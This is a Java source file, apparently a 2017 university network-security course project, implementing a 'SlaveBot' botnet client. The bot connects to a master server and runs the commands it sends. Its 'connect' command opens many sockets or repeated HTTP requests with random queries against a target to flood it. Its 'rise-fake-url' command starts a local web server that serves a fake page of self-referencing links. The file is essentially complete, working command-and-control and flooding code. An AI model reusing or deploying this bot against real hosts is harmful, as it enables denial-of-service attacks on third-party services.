/*
    Created By Ye Yuan 11/28/2017
    CMPE 206 Project Part3

    @for rise-fake-url & down-fake-url command format
    rise-fake-url /path port#
    down-fake-url /path port#
*/
import java.io.*;
import java.util.*;
import java.net.*;

import com.sun.net.httpserver.*;

class RandomString {
    private static final char[] symbols;

    static{
        StringBuilder tmp = new StringBuilder();
        for(char ch = '0'; ch <= '9'; ++ch)
            tmp.append(ch);
        for(char ch = 'a'; ch <= 'z'; ++ch)
            tmp.append(ch);
        symbols = tmp.toString().toCharArray();
    }
    private final Random random = new Random();

    private final char[] buf;

    public RandomString(int length){
        if (length < 1)
            throw new IllegalArgumentException("length < 1: " + length);
        buf = new char[length];
    }
    public String nextString() {
        for (int idx = 0; idx < buf.length; ++idx)
            buf[idx] = symbols[random.nextInt(symbols.length)];
        return new String(buf);
    }

}

//Part3 FakeHP
class FakeHPHandler implements HttpHandler{
    private String rootHP = null;
    FakeHPHandler(String rootHP) {
        this.rootHP = rootHP;
    }
    public void handle(HttpExchange httpEx) throws IOException {
        //return fake url
        String response = fakeHP();
        httpEx.sendResponseHeaders(200, response.length());
        OutputStream output = httpEx.getResponseBody();
        output.write(response.getBytes());
        output.close();
    }
    private String fakeHP() {
       StringBuilder builder = new StringBuilder();
       builder.append("<h1>MyBot</h1><br>")
               .append("<h2>MD5 String: 8bec81aa40b1713505ee6b7543b36960</h2><br>")
               .append("<a href =")
               .append(rootHP)
               .append(rootHP.endsWith("/") ? "" : "/")
               .append("link1>Check this link out!!!</a><br>")
               .append("<a href=")
               .append(rootHP)
               .append(rootHP.endsWith("/") ? "" : "/")
               .append("link2>other link</a><br>")

               .append("======================================Real News==============================================<br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK1</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK2</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK3</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK4</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK5</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK6</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK7</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK8</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK9</a><br>")
               .append("<a href = ")
               .append("https://www.linkedin.com/in/yeyuan0309/> LINK10</a><br>")
       ;

       return builder.toString();
    }

}

class UrlHandler implements HttpHandler {
    private String urldirect = null;
    UrlHandler(String urldirect) {
        this.urldirect = urldirect;
    }
    public void handle(HttpExchange httpEx) throws IOException {
        String response = fakeSP();
        httpEx.sendResponseHeaders(200, response.length());
        OutputStream output = httpEx.getResponseBody();
        output.write(response.getBytes());
        output.close();
    }

    private String fakeSP() {
        StringBuilder builder = new StringBuilder();
        builder.append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link1 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link2 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link3 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link4 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link5 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link6 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link7 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link8 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link9 out!!!</a><br>")
                .append("<a href =")
                .append(urldirect)
                .append(urldirect.endsWith("/") ? "" : "/")
                .append(">Check this link10 out!!!</a><br>")
                ;
        return builder.toString();
    }
}

class SlaveBot {

    public static void main(String[] args) {

        if (args.length != 4) {
            System.out.println("Usage: java SlaveBot -h IPAddress|Hostname -p port#");
            System.exit(-1);
        }

        String mAddress = null;
        int mPort = 0;


        for (int i = 0; i < 4; ++i) {
            if (args[i].equals("-h")) {
                mAddress = args[++i];
            } else if (args[i].equals("-p")) {
                mPort = Integer.parseInt(args[++i]);
            } else {
                System.out.println("Usage: java SlaveBot -h IPAddress|Hostname -p port#");

                System.exit(-1);
            }
        }

        SlaveBot sBot = new SlaveBot(mAddress, mPort);

        try {
            sBot.run();
        } catch (Exception ex) {
            System.exit(-1);
        }
    }

    private Socket sock;

    private LinkedList<tInfo> tList;

    private BufferedReader br;

    public SlaveBot(String mAddress, int mPort) {

        while (true) {
            try {
                this.sock = new Socket(mAddress, mPort);
                this.br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                break;
            } catch (Exception ex) {
                System.exit(0);
            }
        }
        this.tList = new LinkedList<>();
    }

    public void connect(String[] cmd) {
        if (cmd.length < 4) {
            //System.out.println("check1");
            return;
        }

        String tIP = cmd[1];
        String tPort = cmd[2];
        int numOfConn = 1;
        boolean keepAlive = false;
        String url = "";


        try {
            numOfConn = Integer.parseInt(cmd[3]);
        } catch (NumberFormatException ex) {
            numOfConn = 1;
        }
        for (int i = 0; i < numOfConn; ++i) {

            String query = new RandomString((new Random()).nextInt(10)+1).nextString();
            if(cmd.length == 5) {
                if(cmd[4].compareToIgnoreCase("keepAlive") == 0) {
                    keepAlive = true;
                } else{
                    url = "http://" + cmd[1] + "/#q=" + query;
                }
            }

            if (keepAlive) {
                try {
                    tList.add(new tInfo(tIP, tPort));
                    tList.getLast().gettSock().setKeepAlive(true);
                } catch (Exception e){
                    System.out.println("can't create Target");
                }
            }

            if(url !="") {
                try {
                    System.out.println(url);
                    URL myUrl = new URL(url);
                    URLConnection myUrlConn = myUrl.openConnection();
                    myUrlConn.connect();

                } catch (MalformedURLException e) {
                    System.out.println("new URL() failed");
                } catch (IOException e) {
                    System.out.println("openConnection() failed");
                }




            }

        }
    }

    public void disconnect(String[] cmd) {
        int len = cmd.length;
        if (len < 2 || len > 3)
            return;

        int size = tList.size();

        for (int i = 0; i < size; ++i) {
            if (len == 3) {
                if (tList.get(i).gettIP().equalsIgnoreCase(cmd[1]) && tList.get(i).gettPort().equalsIgnoreCase(cmd[2])) {
                    try {
                        tList.get(i).gettSock().shutdownInput();
                        tList.get(i).gettSock().shutdownOutput();
                        tList.get(i).gettSock().close();
                    } catch (IOException ex) {

                    }
                    tList.remove(i);
                    --size;
                    --i;
                }
            } else {
                if (tList.get(i).gettIP().equalsIgnoreCase(cmd[1])) {
                    try {
                        tList.get(i).gettSock().shutdownInput();
                        tList.get(i).gettSock().shutdownOutput();
                        tList.get(i).gettSock().close();
                    } catch (IOException ex) {

                    }
                    tList.remove(i);
                    --size;
                    --i;
                }

            }
        }
    }

    //Project 3 Part
    Map<String, HttpServer> webServer = new HashMap<>();
    private void raiseFake(String[] cmd) throws IOException {
        System.out.println("start");
    if (cmd.length < 1 || cmd.length > 3) {
        return;
    }
    
    String url = cmd[1];
    int port = Integer.valueOf(cmd[2]);

    String key = getServerKey(url, port);
    HttpServer httpS = webServer.get(key);
    if (null != httpS) {
        return;
    }
        
    httpS = HttpServer.create(new InetSocketAddress(port), 0);
    httpS.createContext(url, new FakeHPHandler(url));
    httpS.createContext(url + (url.endsWith("/") ? "link1" : "/link1"), new UrlHandler(url));
    httpS.createContext(url + (url.endsWith("/") ? "link2" : "/link2"), new UrlHandler(url));
    httpS.setExecutor(null);
    httpS.start();
    webServer.put(key, httpS);

    }

    private void downFake(String[] cmd){
        if(cmd.length < 4) {
            return;
        }
        String url = cmd[1];
        int port = Integer.valueOf(cmd[2]);

        String key = getServerKey(url, port);
        HttpServer httpS = webServer.get(key);
        if(null == httpS){
            return;
        }
        httpS.stop(0);
        webServer.remove(key);

    }

    private String getServerKey(String url, int port){
    StringBuilder builder = new StringBuilder(url);
    builder.append("#").append(Integer.toString(port));
    return builder.toString();
    }

    public void parseCmd(String input) throws IOException {
        if (input == null || input.isEmpty())
            return;

        String cmd[] = input.split("[ ]+");

        System.out.println(input);
        switch (cmd[0]) {
            case "connect":
                connect(cmd);
                break;
            case "disconnect":
                disconnect(cmd);
                break;
            case "rise-fake-url":
                raiseFake(cmd);

                break;
            case "down-fake-url":
                downFake(cmd);
                break;
            default:

        }
    }

    public void run() {
        while (true) {
            try {
                String input = br.readLine();
                parseCmd(input);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}

class tInfo {
    private String tIP;
    private String tPort;
    private Socket tSock;

    public tInfo(String tIP, String tPort) {
        this.tIP = tIP.trim();
        this.tPort = tPort;
        int port = Integer.parseInt(tPort);

        try {
            this.tSock = new Socket(this.tIP, port);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }


    public String gettIP() {
        return tIP;
    }

    public String gettPort() {
        return tPort;
    }

    public Socket gettSock(){
        return tSock;
    }

    public void settIP(String tIP){
        this.tIP = tIP;
    }

    public void settPort(String tPort){
        this.tPort = tPort;
    }

    public void settSock(Socket tSock){
        this.tSock = tSock;
    }

    public void close() throws IOException {
        tSock.close();
    }

}